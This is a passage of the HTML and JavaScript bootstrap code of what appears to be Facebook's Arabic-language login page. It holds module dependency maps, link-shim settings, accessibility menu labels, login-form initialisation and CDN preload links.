						"r": ["xblMFJz", "cQxytD7", "3TyePo3", "3rMnPS8", "m6fu0Uj", "Exs+c6w", "FWQ5zbL", "lfTYLcL"],
						"be": 1
					},
					"Tooltip": {
						"r": ["xblMFJz", "cJR20wj", "6SayXSh", "yHdroQC", "cQxytD7", "a2kVExf", "v3RBMPB", "3rMnPS8", "m6fu0Uj", "Exs+c6w", "lfTYLcL", "M29NYeH", "ObZLBkr"],
						"rds": {
							"m": ["FbtLogging", "IntlQtEventFalcoEvent", "PageTransitions", "BanzaiScuba_DEPRECATED", "Animation"],
							"r": ["hnxwrH6", "3TyePo3", "v1+sq1b", "iMefXgN"]
						},
						"be": 1
					},
					"URI": {
						"r": [],
						"be": 1
					},
					"trackReferrer": {
						"r": [],
						"rds": {
							"m": ["BanzaiScuba_DEPRECATED"],
							"r": ["cQxytD7", "3TyePo3", "v1+sq1b", "3rMnPS8"]
						},
						"be": 1
					},
					"PhotoTagApproval": {
						"r": ["\/mnVquy", "lCiWnqM", "3rMnPS8", "lfTYLcL"],
						"be": 1
					},
					"PhotoSnowlift": {
						"r": ["xblMFJz", "mOo6NdC", "4fsirIW", "uI4mGy8", "cJR20wj", "pKluVrH", "9TsS9qn", "b8axCWk", "nZbuDsf", "IhNCONa", "hnxwrH6", "rS+r4uN", "6SayXSh", "JmuxjnF", "yHdroQC", "cQxytD7", "qnCF7Db", "a2kVExf", "XhjL9EU", "3kY+atW", "F7rjU1Z", "RkcVXNo", "xKWpXl1", "Ahpssax", "E8Lmckg", "Z\/0YDhn", "KaS2VEZ", "oPsqUOW", "3TyePo3", "QAJEJ1Z", "7b0v5BY", "xeh51eh", "lfTYLcL", "T+lTEcn", "xbU+6DE", "wzs1q2C", "gLzRNK0", "Etm\/IjM", "v1+sq1b", "v3RBMPB", "0GfxlCl", "DEZESJf", "ObZLBkr", "lCiWnqM", "bhRNkoY", "3rMnPS8", "m6fu0Uj", "acf8ck5", "ccBX1oX", "QqWHC2O", "yLzmy2Y", "9rNH2FC", "6r7xG5Q", "Exs+c6w", "FWQ5zbL", "M29NYeH", "iMefXgN"],
						"rds": {
							"m": ["Animation", "VisualCompletionGating", "FbtLogging", "IntlQtEventFalcoEvent", "BanzaiScuba_DEPRECATED", "PageTransitions"],
							"r": ["JxoJ3RA"]
						},
						"be": 1
					},
					"PhotoTagger": {
						"r": ["xblMFJz", "mOo6NdC", "4fsirIW", "D8ZeyQb", "cJR20wj", "pKluVrH", "I+YjrlV", "9TsS9qn", "V9aeY6e", "hnxwrH6", "elJXsFF", "z4cH5Sq", "rS+r4uN", "6SayXSh", "JmuxjnF", "yHdroQC", "cQxytD7", "fqMQ+tt", "qnCF7Db", "W1HmBID", "a2kVExf", "UqhlYof", "XhjL9EU", "3kY+atW", "F7rjU1Z", "RkcVXNo", "sJu7jug", "xKWpXl1", "jqpVU1P", "E8Lmckg", "HdBQjT6", "OXZLikm", "hMGDL9a", "fXUcXgL", "4gwRtu8", "3TyePo3", "QAJEJ1Z", "7b0v5BY", "fKzyyQv", "hFeShQM", "zusDUHN", "xeh51eh", "lfTYLcL", "T+lTEcn", "eG+1hjB", "3cctxVU", "xbU+6DE", "iawGwfB", "wzs1q2C", "nxDOMHN", "Etm\/IjM", "v1+sq1b", "v3RBMPB", "wrsBmcy", "DEZESJf", "P9ododw", "ObZLBkr", "lCiWnqM", "O6hxjMR", "bhRNkoY", "xnysXB\/", "3rMnPS8", "m6fu0Uj", "UV8u8r5", "Q0qXMhX", "acf8ck5", "JxoJ3RA", "ccBX1oX", "rvFuO9B", "9rNH2FC", "sETc+Q9", "6r7xG5Q", "Exs+c6w", "FWQ5zbL", "IitLduT", "M29NYeH", "iMefXgN", "is+mZu5", "f9ky1ix"],
						"rdfds": {
							"m": ["GamesVideoModerationRulesNux.react", "GamesVideoDeleteCommentDialog.react", "GamesVideoCommentRemovedDialog.react", "CometTooltipDeferredImpl.react"],
							"r": ["wqRy\/7n", "CjT\/9Bp", "wxbS\/lH", "61PU\/dp", "BdDCl1d", "Xk0Aw3Y", "ZqWogdD", "Ov5IE9x", "JZPe1rm", "muCMmpg", "cKXUyua", "FXuW451", "92gPxS9"]
						},
						"rds": {
							"m": ["PresenceStatus", "FbtLogging", "IntlQtEventFalcoEvent", "BanzaiScuba_DEPRECATED", "Animation", "PageTransitions", "LynxAsyncCallbackFalcoEvent", "CometSuspenseFalcoEvent"],
							"r": ["bL4ivUz"]
						},
						"be": 1
					},
					"PhotoTags": {
						"r": ["cQxytD7", "\/mnVquy", "lCiWnqM", "3rMnPS8", "lfTYLcL"],
						"be": 1
					},
					"TagTokenizer": {
						"r": ["pKluVrH", "LqbW4VB", "cQxytD7", "\/mnVquy", "7b0v5BY", "foiom6c", "xbU+6DE", "gLzRNK0", "v3RBMPB", "ObZLBkr", "3rMnPS8", "m6fu0Uj", "Exs+c6w", "lfTYLcL"],
						"rds": {
							"m": ["FbtLogging", "IntlQtEventFalcoEvent"],
							"r": ["hnxwrH6", "3TyePo3", "v1+sq1b"]
						},
						"be": 1
					},
					"AsyncDialog": {
						"r": ["xblMFJz", "cJR20wj", "6SayXSh", "cQxytD7", "a2kVExf", "RkcVXNo", "3TyePo3", "lfTYLcL", "v1+sq1b", "v3RBMPB", "ObZLBkr", "3rMnPS8", "m6fu0Uj", "ccBX1oX", "Exs+c6w", "FWQ5zbL", "M29NYeH"],
						"rds": {
							"m": ["FbtLogging", "IntlQtEventFalcoEvent"],
							"r": ["hnxwrH6"]
						},
						"be": 1
					},
					"Hovercard": {
						"r": ["xblMFJz", "cJR20wj", "rS+r4uN", "6SayXSh", "yHdroQC", "cQxytD7", "a2kVExf", "RkcVXNo", "sJu7jug", "3TyePo3", "hFeShQM", "lfTYLcL", "xbU+6DE", "ObZLBkr", "3rMnPS8", "m6fu0Uj", "ccBX1oX", "rvFuO9B", "Exs+c6w", "FWQ5zbL", "M29NYeH", "iMefXgN", "v1+sq1b"],
						"rds": {
							"m": ["FbtLogging", "IntlQtEventFalcoEvent", "BanzaiScuba_DEPRECATED", "PageTransitions", "Animation"],
							"r": ["hnxwrH6"]
						},
						"be": 1
					},
					"XSalesPromoWWWDetailsDialogAsyncController": {
						"r": ["gWMJgTe"],
						"be": 1
					},
					"XOfferController": {
						"r": ["hIek+bG"],
						"be": 1
					},
					"PerfXSharedFields": {
						"r": ["cQxytD7", "3rMnPS8"],
						"be": 1
					},
					"KeyEventTypedLogger": {
						"r": ["Gj8v9L4", "3TyePo3", "v1+sq1b", "3rMnPS8", "iMefXgN"],
						"rds": {
							"m": ["BanzaiScuba_DEPRECATED"],
							"r": ["cQxytD7"]
						},
						"be": 1
					},
					"Dialog": {
						"r": ["xblMFJz", "mOo6NdC", "cQxytD7", "3TyePo3", "lfTYLcL", "wzs1q2C", "ObZLBkr", "3rMnPS8", "m6fu0Uj", "Exs+c6w", "FWQ5zbL", "a2kVExf", "iMefXgN", "M29NYeH"],
						"rds": {
							"m": ["FbtLogging", "IntlQtEventFalcoEvent", "Animation", "PageTransitions", "BanzaiScuba_DEPRECATED"],
							"r": ["hnxwrH6", "v1+sq1b"]
						},
						"be": 1
					},
					"ExceptionDialog": {
						"r": ["xblMFJz", "cJR20wj", "rS+r4uN", "6SayXSh", "JmuxjnF", "yHdroQC", "cQxytD7", "a2kVExf", "3kY+atW", "RkcVXNo", "3TyePo3", "7b0v5BY", "zBwBFaB", "lfTYLcL", "v1+sq1b", "ObZLBkr", "3rMnPS8", "m6fu0Uj", "AvkS+CW", "ccBX1oX", "9rNH2FC", "Exs+c6w", "FWQ5zbL", "FDYHMVn", "M29NYeH"],
						"rds": {
							"m": ["FbtLogging", "IntlQtEventFalcoEvent"],
							"r": ["hnxwrH6"]
						},
						"be": 1
					},
					"QuickSandSolver": {
						"r": ["+ClWygH", "cQxytD7", "euxcw1r", "8ELCBwH", "T+lTEcn", "ObZLBkr", "3rMnPS8", "lfTYLcL", "Exs+c6w"],
						"rds": {
							"m": ["FbtLogging", "IntlQtEventFalcoEvent"],
							"r": ["hnxwrH6", "3TyePo3", "v1+sq1b"]
						},
						"be": 1
					},
					"ConfirmationDialog": {
						"r": ["oE4DofT", "ObZLBkr", "3rMnPS8", "m6fu0Uj", "lfTYLcL"],
						"be": 1
					},
					"QPLInspector": {
						"r": ["VvVFw8n"],
						"be": 1
					},
					"ReactDOM": {
						"r": ["a2kVExf", "M29NYeH", "3TyePo3", "3rMnPS8", "lfTYLcL"],
						"be": 1
					},
					"ContextualLayerInlineTabOrder": {
						"r": ["hnxwrH6", "cQxytD7", "hFeShQM", "3rMnPS8", "m6fu0Uj", "Exs+c6w", "lfTYLcL"],
						"be": 1
					},
					"XUIDialogButton.react": {
						"r": ["xblMFJz", "rS+r4uN", "6SayXSh", "cQxytD7", "a2kVExf", "3TyePo3", "7b0v5BY", "lfTYLcL", "v1+sq1b", "3rMnPS8", "m6fu0Uj", "M29NYeH", "Exs+c6w"],
						"rds": {
							"m": ["FbtLogging", "IntlQtEventFalcoEvent"],
							"r": ["hnxwrH6"]
						},
						"be": 1
					},
					"XUIDialogBody.react": {
						"r": ["cJR20wj", "a2kVExf", "3kY+atW", "7b0v5BY", "3rMnPS8", "m6fu0Uj", "9rNH2FC", "M29NYeH"],
						"be": 1
					},
					"XUIDialogFooter.react": {
						"r": ["xblMFJz", "cJR20wj", "a2kVExf", "3kY+atW", "7b0v5BY", "lfTYLcL", "3rMnPS8", "m6fu0Uj", "9rNH2FC", "FDYHMVn", "M29NYeH"],
						"be": 1
					},
					"XUIDialogTitle.react": {
						"r": ["xblMFJz", "cJR20wj", "6SayXSh", "cQxytD7", "a2kVExf", "RkcVXNo", "3TyePo3", "lfTYLcL", "v1+sq1b", "3rMnPS8", "m6fu0Uj", "ccBX1oX", "M29NYeH", "Exs+c6w"],
						"rds": {
							"m": ["FbtLogging", "IntlQtEventFalcoEvent"],
							"r": ["hnxwrH6"]
						},
						"be": 1
					},
					"XUIGrayText.react": {
						"r": ["a2kVExf", "3kY+atW", "7b0v5BY", "3rMnPS8", "m6fu0Uj", "9rNH2FC", "M29NYeH"],
						"be": 1
					},
					"DialogX": {
						"r": ["xblMFJz", "cJR20wj", "6SayXSh", "cQxytD7", "3TyePo3", "lfTYLcL", "ObZLBkr", "3rMnPS8", "m6fu0Uj", "ccBX1oX", "Exs+c6w", "FWQ5zbL"],
						"rds": {
							"m": ["FbtLogging", "IntlQtEventFalcoEvent"],
							"r": ["hnxwrH6", "v1+sq1b"]
						},
						"be": 1
					},
					"React": {
						"r": ["a2kVExf", "M29NYeH"],
						"be": 1
					}
				}
			})
		});
	</script>
	<script>
		requireLazy(["InitialJSLoader"], function (InitialJSLoader) {
			InitialJSLoader.loadOnDOMContentReady(["M29NYeH", "hnxwrH6", "cQxytD7", "v1+sq1b", "xblMFJz", "a2kVExf", "3TyePo3", "3rMnPS8", "m6fu0Uj", "Ahpssax", "JxoJ3RA", "ObZLBkr", "iMefXgN", "P\/mr5VE"]);
		});
	</script>
	<script>
		requireLazy(["TimeSliceImpl", "ServerJS"], function (TimeSlice, ServerJS) {
			var s = (new ServerJS());
			s.handle({
				"define": [
					["LinkshimHandlerConfig", [], {
						"supports_meta_referrer": true,
						"default_meta_referrer_policy": "origin-when-crossorigin",
						"switched_meta_referrer_policy": "origin",
						"non_linkshim_lnfb_mode": null,
						"link_react_default_hash": "AT2efkrNcCuNzaD-T4yxVLcn46q_f_tYAh48U0c1xlz9hzZ8yZNuImYT90K7Yql_E6Nn-nB7fSjLw7wy1qdrKdmr6ruhWn2BQpyEm0s_Uqy3b5cznx_wSReJ3DTXAQfXHkmlBOXkD6hI3QWKCHXL3A",
						"untrusted_link_default_hash": "AT21Dv3T1_5m95WRfDmVNT1XxgKcYOYougyTuI_JYjtkkVYkD1qyrnIO8TYO_xAKsF5uj6xb-tTodg11YBeCgfDB6Lw3VzslJZwGiszEdEOtnfrvt8vhpLP-vbXleQL9cHULmEBskN2Z5fotTGQMeA",
						"linkshim_host": "l.facebook.com",
						"linkshim_path": "\/l.php",
						"linkshim_enc_param": "h",
						"linkshim_url_param": "u",
						"use_rel_no_opener": true,
						"always_use_https": true,
						"onion_always_shim": true,
						"middle_click_requires_event": true,
						"www_safe_js_mode": "asynclazy",
						"m_safe_js_mode": "MLynx_asynclazy",
						"ghl_param_link_shim": false,
						"click_ids": [],
						"is_linkshim_supported": true,
						"current_domain": "facebook.com",
						"blocklisted_domains": ["ad.doubleclick.net", "ads-encryption-url-example.com", "bs.serving-sys.com", "ad.atdmt.com", "adform.net", "ad13.adfarm1.adition.com", "ilovemyfreedoms.com", "secure.adnxs.com"],
						"is_mobile_device": false
					}, 27]
				],
				"instances": [
					["__inst_5b4d0c00_0_0_bc", ["Menu", "XUIMenuWithSquareCorner", "XUIMenuTheme"],
						[
							[], {
								"id": "u_0_0_ru",
								"behaviors": [{
									"__m": "XUIMenuWithSquareCorner"
								}],
								"theme": {
									"__m": "XUIMenuTheme"
								}
							}
						], 2
					],
					["__inst_5b4d0c00_0_1_Wa", ["Menu", "MenuItem", "__markup_3310c079_0_0_Tl", "HTML", "__markup_3310c079_0_1_gA", "__markup_3310c079_0_2_P1", "__markup_3310c079_0_3_x6", "XUIMenuWithSquareCorner", "XUIMenuTheme"],
						[
							[{
								"value": "key_shortcuts",
								"ctor": {
									"__m": "MenuItem"
								},
								"markup": {
									"__m": "__markup_3310c079_0_0_Tl"
								},
								"label": "\u0645\u0633\u0627\u0639\u062f\u0629 \u0628\u0634\u0623\u0646 \u0627\u062e\u062a\u0635\u0627\u0631\u0627\u062a \u0644\u0648\u062d\u0629 \u0627\u0644\u0645\u0641\u0627\u062a\u064a\u062d...",
								"title": "\u0645\u0633\u0627\u0639\u062f\u0629 \u0628\u0634\u0623\u0646 \u0627\u062e\u062a\u0635\u0627\u0631\u0627\u062a \u0644\u0648\u062d\u0629 \u0627\u0644\u0645\u0641\u0627\u062a\u064a\u062d...",
								"className": null
							}, {
								"href": "\/help\/accessibility",
								"target": "_blank",
								"value": "help_center",
								"ctor": {
									"__m": "MenuItem"
								},
								"markup": {
									"__m": "__markup_3310c079_0_1_gA"
								},
								"label": "\u0645\u0631\u0643\u0632 \u0627\u0644\u0645\u0633\u0627\u0639\u062f\u0629 \u0627\u0644\u0645\u062a\u0639\u0644\u0642\u0629 \u0628\u0625\u0645\u0643\u0627\u0646\u064a\u0629 \u0627\u0644\u0648\u0635\u0648\u0644",
								"title": "\u0645\u0631\u0643\u0632 \u0627\u0644\u0645\u0633\u0627\u0639\u062f\u0629 \u0627\u0644\u0645\u062a\u0639\u0644\u0642\u0629 \u0628\u0625\u0645\u0643\u0627\u0646\u064a\u0629 \u0627\u0644\u0648\u0635\u0648\u0644",
								"className": null
							}, {
								"href": "\/help\/contact\/accessibility",
								"target": "_blank",
								"value": "submit_feedback",
								"ctor": {
									"__m": "MenuItem"
								},
								"markup": {
									"__m": "__markup_3310c079_0_2_P1"
								},
								"label": "\u0625\u0631\u0633\u0627\u0644 \u0645\u0644\u0627\u062d\u0638\u0627\u062a",
								"title": "",
								"className": null
							}, {
								"href": "\/accessibility",
								"target": "_blank",
								"value": "facebook_page",
								"ctor": {
									"__m": "MenuItem"
								},
								"markup": {
									"__m": "__markup_3310c079_0_3_x6"
								},
								"label": "\u062a\u062d\u062f\u064a\u062b\u0627\u062a \u0645\u0646 \u0625\u0645\u0643\u0627\u0646\u064a\u0629 \u0627\u0644\u0648\u0635\u0648\u0644 \u0639\u0644\u0649 \u0641\u064a\u0633\u0628\u0648\u0643",
								"title": "\u062a\u062d\u062f\u064a\u062b\u0627\u062a \u0645\u0646 \u0625\u0645\u0643\u0627\u0646\u064a\u0629 \u0627\u0644\u0648\u0635\u0648\u0644 \u0639\u0644\u0649 \u0641\u064a\u0633\u0628\u0648\u0643",
								"className": null
							}], {
								"id": "u_0_1_SS",
								"behaviors": [{
									"__m": "XUIMenuWithSquareCorner"
								}],
								"theme": {
									"__m": "XUIMenuTheme"
								}
							}
						], 2
					],
					["__inst_e5ad243d_0_0_Ap", ["PopoverMenu", "__inst_1de146dc_0_1_sf", "__elem_ec77afbd_0_1_0r", "__inst_5b4d0c00_0_1_Wa"],
						[{
							"__m": "__inst_1de146dc_0_1_sf"
						}, {
							"__m": "__elem_ec77afbd_0_1_0r"
						}, {
							"__m": "__inst_5b4d0c00_0_1_Wa"
						},
						[]
						], 2
					],
					["__inst_e5ad243d_0_1_Sb", ["PopoverMenu", "__inst_1de146dc_0_0_bB", "__elem_ec77afbd_0_0_zM", "__inst_5b4d0c00_0_0_bc"],
						[{
							"__m": "__inst_1de146dc_0_0_bB"
						}, {
							"__m": "__elem_ec77afbd_0_0_zM"
						}, {
							"__m": "__inst_5b4d0c00_0_0_bc"
						},
						[]
						], 2
					],
					["__inst_1de146dc_0_0_bB", ["Popover", "__elem_1de146dc_0_0_BT", "__elem_ec77afbd_0_0_zM", "ContextualLayerAutoFlip", "ContextualDialogArrow"],
						[{
							"__m": "__elem_1de146dc_0_0_BT"
						}, {
							"__m": "__elem_ec77afbd_0_0_zM"
						},
						[{
							"__m": "ContextualLayerAutoFlip"
						}, {
							"__m": "ContextualDialogArrow"
						}], {
							"alignh": "left",
							"position": "below"
						}
						], 2
					],
					["__inst_1de146dc_0_1_sf", ["Popover", "__elem_1de146dc_0_1_tt", "__elem_ec77afbd_0_1_0r", "ContextualLayerAutoFlip", "ContextualDialogArrow"],
						[{
							"__m": "__elem_1de146dc_0_1_tt"
						}, {
							"__m": "__elem_ec77afbd_0_1_0r"
						},
						[{
							"__m": "ContextualLayerAutoFlip"
						}, {
							"__m": "ContextualDialogArrow"
						}], {
							"alignh": "right",
							"position": "below"
						}
						], 2
					]
				],
				"markup": [
					["__markup_3310c079_0_0_Tl", {
						"__html": "\u0645\u0633\u0627\u0639\u062f\u0629 \u0628\u0634\u0623\u0646 \u0627\u062e\u062a\u0635\u0627\u0631\u0627\u062a \u0644\u0648\u062d\u0629 \u0627\u0644\u0645\u0641\u0627\u062a\u064a\u062d..."
					}, 1],
					["__markup_3310c079_0_1_gA", {
						"__html": "\u0645\u0631\u0643\u0632 \u0627\u0644\u0645\u0633\u0627\u0639\u062f\u0629 \u0627\u0644\u0645\u062a\u0639\u0644\u0642\u0629 \u0628\u0625\u0645\u0643\u0627\u0646\u064a\u0629 \u0627\u0644\u0648\u0635\u0648\u0644"
					}, 1],
					["__markup_3310c079_0_2_P1", {
						"__html": "\u0625\u0631\u0633\u0627\u0644 \u0645\u0644\u0627\u062d\u0638\u0627\u062a"
					}, 1],
					["__markup_3310c079_0_3_x6", {
						"__html": "\u062a\u062d\u062f\u064a\u062b\u0627\u062a \u0645\u0646 \u0625\u0645\u0643\u0627\u0646\u064a\u0629 \u0627\u0644\u0648\u0635\u0648\u0644 \u0639\u0644\u0649 \u0641\u064a\u0633\u0628\u0648\u0643"
					}, 1]
				],
				"elements": [
					["__elem_a588f507_0_1_0\/", "u_0_3_rZ", 1],
					["__elem_3fc3da18_0_0_51", "u_0_4_Df", 1],
					["__elem_51be6cb7_0_0_O+", "u_0_5_fy", 1],
					["__elem_1de146dc_0_0_BT", "u_0_6_lS", 1],
					["__elem_ec77afbd_0_0_zM", "u_0_7_T\/", 2],
					["__elem_1de146dc_0_1_tt", "u_0_8_Xj", 1],
					["__elem_ec77afbd_0_1_0r", "u_0_9_wI", 2],
					["__elem_a588f507_0_0_Bw", "globalContainer", 2],
					["__elem_a588f507_0_2_8L", "content", 1],
					["__elem_835c633a_0_0_nd", "u_0_a_42", 1],
					["__elem_a588f507_0_3_4X", "u_0_b_kX", 1],
					["__elem_a588f507_0_4_+i", "u_0_c_CE", 1],
					["__elem_45d73b5d_0_0_dy", "u_0_d_tq", 1]
				],
				"require": [
					["ServiceWorkerLoginAndLogout", "login", [],
						[]
					],
					["WebPixelRatioDetector", "startDetecting", [],
						[false]
					],
					["ScriptPath", "set", [],
						["XIndexReduxController", "a1f3c513", {
							"imp_id": "0F559KauBkyFZVJ6r",
							"ef_page": null,
							"uri": "https:\/\/www.facebook.com\/"
						}]
					],
					["UITinyViewportAction", "init", [],
						[]
					],
					["ResetScrollOnUnload", "init", ["__elem_a588f507_0_0_Bw"],
						[{
							"__m": "__elem_a588f507_0_0_Bw"
						}]
					],
					["AccessibilityWebVirtualCursorClickLogger", "init", ["__elem_a588f507_0_0_Bw"],
						[
							[{
								"__m": "__elem_a588f507_0_0_Bw"
							}]
						]
					],
					["KeyboardActivityLogger", "init", [],
						[]
					],
					["FocusRing", "init", [],
						[]
					],
					["ErrorpassConsole", "listenForUncaughtErrors", [],
						[]
					],
					["HardwareCSS", "init", [],
						[]
					],
					["NavigationAssistantController", "init", ["__elem_3fc3da18_0_0_51", "__elem_51be6cb7_0_0_O+", "__inst_5b4d0c00_0_0_bc", "__inst_5b4d0c00_0_1_Wa", "__inst_e5ad243d_0_0_Ap", "__inst_e5ad243d_0_1_Sb"],
						[{
							"__m": "__elem_3fc3da18_0_0_51"
						}, {
							"__m": "__elem_51be6cb7_0_0_O+"
						}, {
							"__m": "__inst_5b4d0c00_0_0_bc"
						}, {
							"__m": "__inst_5b4d0c00_0_1_Wa"
						}, null, {
							"accessibilityPopoverMenu": {
								"__m": "__inst_e5ad243d_0_0_Ap"
							},
							"globalPopoverMenu": null,
							"sectionsPopoverMenu": {
								"__m": "__inst_e5ad243d_0_1_Sb"
							}
						}]
					],
					["__inst_e5ad243d_0_1_Sb"],
					["__inst_1de146dc_0_0_bB"],
					["__inst_e5ad243d_0_0_Ap"],
					["__inst_1de146dc_0_1_sf"],
					["IntlUtils"],
					["FBLynx", "setupDelegation", [],
						[]
					],
					["LoginFormToggle", "initPasswordToggle", ["__elem_a588f507_0_3_4X", "__elem_a588f507_0_4_+i"],
						[{
							"__m": "__elem_a588f507_0_3_4X"
						}, {
							"__m": "__elem_a588f507_0_4_+i"
						}]
					],
					["LoginFormController", "init", ["__elem_835c633a_0_0_nd", "__elem_45d73b5d_0_0_dy"],
						[{
							"__m": "__elem_835c633a_0_0_nd"
						}, {
							"__m": "__elem_45d73b5d_0_0_dy"
						}, null, true, {
							"pubKey": {
								"publicKey": "4f1b66b683afbf74e362416355437028d87f5c9034fa1950a142c1eeb819543b",
								"keyId": 179
							}
						}]
					],
					["BrowserPrefillLogging", "initContactpointFieldLogging", [],
						[{
							"contactpointFieldID": "email",
							"serverPrefill": ""
						}]
					],
					["BrowserPrefillLogging", "initPasswordFieldLogging", [],
						[{
							"passwordFieldID": "pass"
						}]
					],
					["FocusListener"],
					["FlipDirectionOnKeypress"],
					["Animation"],
					["PageTransitions"],
					["RequireDeferredReference", "unblock", [],
						[
							["BanzaiScuba_DEPRECATED", "Animation", "FbtLogging", "IntlQtEventFalcoEvent", "PageTransitions"], "sd"
						]
					],
					["RequireDeferredReference", "unblock", [],
						[
							["BanzaiScuba_DEPRECATED", "Animation", "FbtLogging", "IntlQtEventFalcoEvent", "PageTransitions"], "css"
						]
					],
					["TimeSliceImpl"],
					["HasteSupportData"],
					["ServerJS"],
					["Run"],
					["InitialJSLoader"]
				],
				"contexts": [
					[{
						"__m": "__elem_a588f507_0_1_0\/"
					}, true],
					[{
						"__m": "__elem_a588f507_0_2_8L"
					}, true]
				]
			});
			requireLazy(["Run"], function (Run) {
				Run.onAfterLoad(function () {
					s.cleanup(TimeSlice)
				})
			});
		});

		onloadRegister_DEPRECATED(function () {
			useragentcm();
		});
	</script>
	<script>
		now_inl = (function () {
			var p = window.performance;
			return p && p.now && p.timing && p.timing.navigationStart ? function () {
				return p.now() + p.timing.navigationStart
			} : function () {
				return new Date().getTime()
			};
		})();
		window.__bigPipeFR = now_inl();
	</script>
	<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yK/l/1,cross/ykIKCC0i1lo.css?_nc_x=Ij3Wp8lg5Kz"
		as="style" crossorigin="anonymous" />
	<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y-/l/1,cross/3b4zD7Hav6i.css?_nc_x=Ij3Wp8lg5Kz"
		as="style" crossorigin="anonymous" />
	<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yW/l/1,cross/oMDvHENLDyA.css?_nc_x=Ij3Wp8lg5Kz"
		as="style" crossorigin="anonymous" />
	<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y5/l/1,cross/zpuhxOZm2cy.css?_nc_x=Ij3Wp8lg5Kz"
		as="style" crossorigin="anonymous" />
	<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yN/l/1,cross/B4foWzYuK2d.css?_nc_x=Ij3Wp8lg5Kz"
		as="style" crossorigin="anonymous" />
	<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yM/l/1,cross/r9Zm00xP6MD.css?_nc_x=Ij3Wp8lg5Kz"
		as="style" crossorigin="anonymous" />
	<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yM/l/1,cross/QceiG7DyPif.css?_nc_x=Ij3Wp8lg5Kz"
		as="style" crossorigin="anonymous" />
	<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/ym/l/1,cross/PnuEuauFqCy.css?_nc_x=Ij3Wp8lg5Kz"
		as="style" crossorigin="anonymous" />
	<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yg/l/1,cross/bLo49mCUayX.css?_nc_x=Ij3Wp8lg5Kz"
		as="style" crossorigin="anonymous" />
	<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3iJoa4/y6/l/ar_AR/6d1QoB2_uVs.js?_nc_x=Ij3Wp8lg5Kz"
		as="script" crossorigin="anonymous" nonce="VWgCIkTZ" />
	<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yb/l/1,cross/nF5MLVn3p87.css?_nc_x=Ij3Wp8lg5Kz"
		as="style" crossorigin="anonymous" />
	<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yd/r/Nk-rM4iWJZl.js?_nc_x=Ij3Wp8lg5Kz" as="script"
		crossorigin="anonymous" nonce="VWgCIkTZ" />
	<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yI/r/JMDziI07c6T.js?_nc_x=Ij3Wp8lg5Kz" as="script"
		crossorigin="anonymous" nonce="VWgCIkTZ" />
	<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yj/r/IUy0P1uEqH3.js?_nc_x=Ij3Wp8lg5Kz" as="script"
		crossorigin="anonymous" nonce="VWgCIkTZ" />
	<link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/ym/l/1,cross/KHFwP3wSXUo.css?_nc_x=Ij3Wp8lg5Kz"
		as="style" crossorigin="anonymous" />
	<script>
		window.__bigPipeCtor = now_inl();
		requireLazy(["BigPipe"], function (BigPipe) {
			define("__bigPipe", [], window.bigPipe = new BigPipe({
				"forceFinish": true,
				"config": {
					"flush_pagelets_asap": true,
					"dispatch_pagelet_replayable_actions": false
				}
			}));
		});
	</script>
	<script nonce="VWgCIkTZ">
		(function () {
			var n = now_inl();
			requireLazy(["__bigPipe"], function (bigPipe) {
				bigPipe.beforePageletArrive("first_response", n);
			})
		})();
	</script>
	<script nonce="VWgCIkTZ">
		requireLazy(["__bigPipe"], (function (bigPipe) {
			bigPipe.onPageletArrive({
				displayResources: ["/uaktyf", "FWQ5zbL", "lfTYLcL", "6SayXSh", "cJR20wj", "v3RBMPB", "Exs+c6w", "WTnViMe", "GYAkcUG", "cQxytD7", "RkcVXNo", "3TyePo3", "v1+sq1b", "3rMnPS8", "9rNH2FC", "P/mr5VE"],
				id: "first_response",
				phase: 0,
				last_in_phase: true,
				tti_phase: 0,
				all_phases: [63],
				hsrp: {
					hblp: {
						sr_revision: 1004120961,
						consistency: {
							rev: 1004120961
						}
					}
				},
				allResources: ["/uaktyf", "FWQ5zbL", "lfTYLcL", "6SayXSh", "cJR20wj", "v3RBMPB", "Exs+c6w", "M29NYeH", "hnxwrH6", "cQxytD7", "v1+sq1b", "xblMFJz", "a2kVExf", "3TyePo3", "3rMnPS8", "m6fu0Uj", "Ahpssax", "JxoJ3RA", "WTnViMe", "GYAkcUG", "RkcVXNo", "9rNH2FC", "ObZLBkr", "P/mr5VE", "iMefXgN"]
			});
		}));
	</script>
	<script>
		requireLazy(["__bigPipe"], function (bigPipe) {
			bigPipe.setPageID("6985657454491897372-0")
		});
		CavalryLogger.setPageID("6985657454491897372-0");
	</script>
	<script nonce="VWgCIkTZ">
		(function () {
			var n = now_inl();
			requireLazy(["__bigPipe"], function (bigPipe) {
				bigPipe.beforePageletArrive("last_response", n);
			})
		})();
	</script>
